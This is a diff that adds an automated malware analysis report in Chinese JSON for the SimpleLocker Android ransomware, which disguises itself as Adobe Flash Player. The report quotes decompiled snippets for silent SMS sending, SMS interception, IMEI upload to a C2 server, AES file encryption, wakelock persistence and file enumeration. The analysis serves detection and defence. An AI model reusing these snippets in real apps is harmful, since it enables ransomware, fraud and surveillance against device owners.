@@ -1,0 +1,243 @@
+{
+  "APK信息": {
+    "文件名": "304efc1f0b5b8c6c711c03a13d5d8b90755cec00cac1218a7a4a22b091ffb30b.apk",
+    "sha256": "304efc1f0b5b8c6c711c03a13d5d8b90755cec00cac1218a7a4a22b091ffb30b",
+    "包名": "com.simplelocker",
+    "应用名": "Adobe Flash Player 12.2",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 302.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\simplelocker\\utils\\Utils;",
+          "method_signature": "if(parts.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager sms = SmsManager.getDefault();\nArrayList<String> parts = sms.divideMessage(text);\nif (parts.size() > 1) {\n    sms.sendMultipartTextMessage(number, null, parts, null, null);\n} else {\n    sms.sendTextMessage(number, null, text, null, null);\n}",
+          "malicious_code_snippet_context": "          if (number == \"\") {\n              return false;\n          }\n>>>         SmsManager sms = SmsManager.getDefault();\n>>>         ArrayList<String> parts = sms.divideMessage(text);\n>>>         if (parts.size() > 1) {\n>>>             sms.sendMultipartTextMessage(number, null, parts, null, null);\n>>>         } else {\n>>>             sms.sendTextMessage(number, null, text, null, null);\n>>>         }\n          return true;\n      }\n  }",
+          "behavior_description": "该方法通过 SmsManager 静默发送短信，无需用户交互。短信号号(number)和内容(text)来自方法参数，根据内容长度自动选择 sendMultipartTextMessage 或 sendTextMessage 发送。在已确认的恶意样本 simplelocker（勒索软件）中，此行为用于静默发送短信到指定号码，可能导致用户资费消耗或参与短信欺诈。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\simplelocker\\MessageReceiver;",
+          "method_signature": "if(!wasIncomingMessageIntercepted)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (blockedNumbers.contains(sender)) { if (!wasIncomingMessageIntercepted) { Sender.sendInterceptedIncomingSMS(context, messages.get(sender), sender); } abortBroadcast(); } private boolean processControlCommand(String number, String text, Context context) { SmsProcessor processor = new SmsProcessor(text, context); if (processor.processCommand()) { abortBroadcast(); return false; }",
+          "malicious_code_snippet_context": "if (blockedNumbers.contains(sender)) { if (!wasIncomingMessageIntercepted) { Sender.sendInterceptedIncomingSMS(context, messages.get(sender), sender); } abortBroadcast(); } private boolean processControlCommand(String number, String text, Context context) { SmsProcessor processor = new SmsProcessor(text, context); if (processor.processCommand()) { abortBroadcast(); return false; }",
+          "behavior_description": "代码在短信广播接收器中检查短信发送者号码是否在黑名单(blockedNumbers)列表中，若匹配则调用abortBroadcast()终止短信广播，阻止系统短信应用和其他应用收到该短信，实现短信拦截；同时通过Sender.sendInterceptedIncomingSMS将拦截到的短信内容转发出去。此外processControlCommand方法处理远程控制指令短信后同样调用abortBroadcast()隐藏指令短信，防止用户察觉。数据流向：接收到的短信内容(messages.get(sender))→abortBroadcast()拦截广播 + sendInterceptedIncomingSMS转发短信",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\simplelocker\\utils\\Sender;",
+          "method_signature": "sendLockerCheck(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "jObj.put(\"device id\", Utils.getIMEI(context));\nHttpSender sender = new HttpSender(jObj.toString(), HttpSender.RequestType.TYPE_LOCKER_CHECK, context);\nsender.startSending();",
+          "malicious_code_snippet_context": "          try {\n              JSONObject jObj = new JSONObject();\n              jObj.put(\"type\", \"locker check\");\n>>>             jObj.put(\"device id\", Utils.getIMEI(context));\n>>>             jObj.put(\"client number\", Constants.CLIENT_NUMBER);\n>>>             HttpSender sender = new HttpSender(jObj.toString(), HttpSender.RequestType.TYPE_LOCKER_CHECK, context);\n              sender.startSending();\n          } catch (JSONException e) {\n              e.printStackTrace();",
+          "behavior_description": "该方法构造一个JSON对象，通过Utils.getIMEI(context)获取设备IMEI标识符，将其作为\"device id\"字段打包，随后通过HttpSender将包含IMEI的JSON数据发送到远程服务器，实现设备指纹采集与外传。数据流向为：getIMEI()获取设备唯一标识→HTTP网络请求外发至远程C2服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\simplelocker\\AesCrypt;",
+          "method_signature": "encrypt(String rawFile, String encryptedFile)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.cipher.init(1, this.key, this.spec);\nCipherOutputStream cos = new CipherOutputStream(fos, this.cipher);\nbyte[] d = new byte[8];\nwhile (true) {\n    int b = fis.read(d);\n    if (b != -1) {\n        cos.write(d, 0, b);\n    } else {\n        cos.flush();\n        cos.close();\n        fis.close();\n    }\n}",
+          "malicious_code_snippet_context": "      public void encrypt(String rawFile, String encryptedFile) throws Exception {\n          FileInputStream fis = new FileInputStream(rawFile);\n          FileOutputStream fos = new FileOutputStream(encryptedFile);\n>>>         this.cipher.init(1, this.key, this.spec);\n>>>         CipherOutputStream cos = new CipherOutputStream(fos, this.cipher);\n>>>         byte[] d = new byte[8];\n>>>         while (true) {\n>>>             int b = fis.read(d);\n>>>             if (b != -1) {\n>>>                 cos.write(d, 0, b);\n>>>             } else {\n>>>                 cos.flush();\n>>>                 cos.close();\n>>>                 fis.close();\n>>>                 return;\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "该代码使用AES加密算法初始化加密器，通过FileInputStream读取用户原始文件（rawFile），并通过CipherOutputStream将加密后的数据写入到新文件（encryptedFile）中，实现勒索软件的文件加密行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\simplelocker\\CheckService;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class CheckService extends Service {\n    private PowerManager.WakeLock wakeLock;\n    @Override\n    public void onCreate() {\n        this.deviceManager = (DevicePolicyManager) getSystemService(\"device_policy\");\n        PowerManager mgr = (PowerManager) getSystemService(\"power\");\n        this.wakeLock = mgr.newWakeLock(1, \"WakeLock\");\n        this.wakeLock.acquire();\n        isRunning = true;\n    }\n}",
+          "malicious_code_snippet_context": "  import org.json.JSONObject;\n  \n  /* loaded from: classes.dex */\n>>> public class CheckService extends Service {\n>>>     public static boolean isRunning = false;\n>>>     private DevicePolicyManager deviceManager;\n>>>     private SharedPreferences settings;\n>>>     private PowerManager.WakeLock wakeLock;\n>>> \n>>>     @Override // android.app.Service\n>>>     public void onCreate() {\n>>>         this.deviceManager = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>         PowerManager mgr = (PowerManager) getSystemService(\"power\");\n>>>         this.wakeLock = mgr.newWakeLock(1, \"WakeLock\");\n          this.wakeLock.acquire();\n          isRunning = true;\n          this.settings = getSharedPreferences(Constants.PREFS_NAME, 0);",
+          "behavior_description": "该代码属于已知勒索软件SimpleLocker的保活组件。CheckService在onCreate中通过PowerManager.newWakeLock(PARTIAL_WAKE_LOCK)获取并acquire唤醒锁，使设备CPU保持唤醒状态，确保恶意服务持续运行不被系统休眠杀死；同时获取DevicePolicyManager设备管理器权限，用于锁屏或防止用户卸载。这是勒索软件持久化驻留的关键机制，配合isRunning标志位实现服务状态追踪与自动重启。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\simplelocker\\Main;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import com.simplelocker.camera.GBTakePictureNoPreview;\npublic class Main extends Activity {\n    private GBTakePictureNoPreview c;\n    private SurfaceView surfaceView;",
+          "malicious_code_snippet_context": "  import android.os.Handler;\n  import android.view.KeyEvent;\n  import android.view.SurfaceView;\n>>> import com.simplelocker.camera.GBTakePictureNoPreview;\n>>> \n>>> /* loaded from: classes.dex */\n>>> public class Main extends Activity {\n      public static boolean isRunning = false;\n      private GBTakePictureNoPreview c;\n      private SharedPreferences settings;",
+          "behavior_description": "SimpleLocker勒索软件主Activity中声明并引入了无预览拍照类GBTakePictureNoPreview，该类可在不显示相机预览界面的情况下秘密调用摄像头进行拍照，用于窃取用户隐私照片或进行恐吓勒索。数据流向：Camera.open()/Camera.takePicture()（通过GBTakePictureNoPreview无预览拍照）→ 隐私照片数据被收集/上传至C2服务器",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\simplelocker\\FilesEncryptor;",
+          "method_signature": "getFileNames(File file)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void getFileNames(File file) { File[] list = file.listFiles(); for (File file2 : list) { File tempFile = new File(file.getAbsolutePath(), file2.getName()); if (tempFile.isDirectory() && tempFile.listFiles() != null) { getFileNames(tempFile); } else { String path = tempFile.getAbsolutePath(); String extension = path.substring(path.lastIndexOf(\".\") + 1); if (this.extensionsToDecrypt.contains(extension)) { this.filesToDecrypt.add(tempFile.getAbsolutePath()); } else if (Constants.EXTENSIONS_TO_ENCRYPT.contains(extension)) {",
+          "malicious_code_snippet_context": "private void getFileNames(File file) { File[] list = file.listFiles(); for (File file2 : list) { File tempFile = new File(file.getAbsolutePath(), file2.getName()); if (tempFile.isDirectory() && tempFile.listFiles() != null) { getFileNames(tempFile); } else { String path = tempFile.getAbsolutePath(); String extension = path.substring(path.lastIndexOf(\".\") + 1); if (this.extensionsToDecrypt.contains(extension)) { this.filesToDecrypt.add(tempFile.getAbsolutePath()); } else if (Constants.EXTENSIONS_TO_ENCRYPT.contains(extension)) {",
+          "behavior_description": "该代码属于 SimpleLocker 勒索软件的文件加密器组件。getFileNames 方法递归遍历用户设备存储目录中的所有文件，根据文件扩展名筛选目标文件，将匹配 EXTENSIONS_TO_ENCRYPT 的文件路径收集到待加密列表中，匹配 extensionsToDecrypt 的收集到待解密列表中。收集完成后，勒索软件会对这些文件进行 AES 加密并删除原始文件，实现勒索目的。数据流向：file.listFiles() 递归遍历存储 → 按扩展名筛选目标文件 → 收集文件路径至加密列表 → 后续加密并删除原文件。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
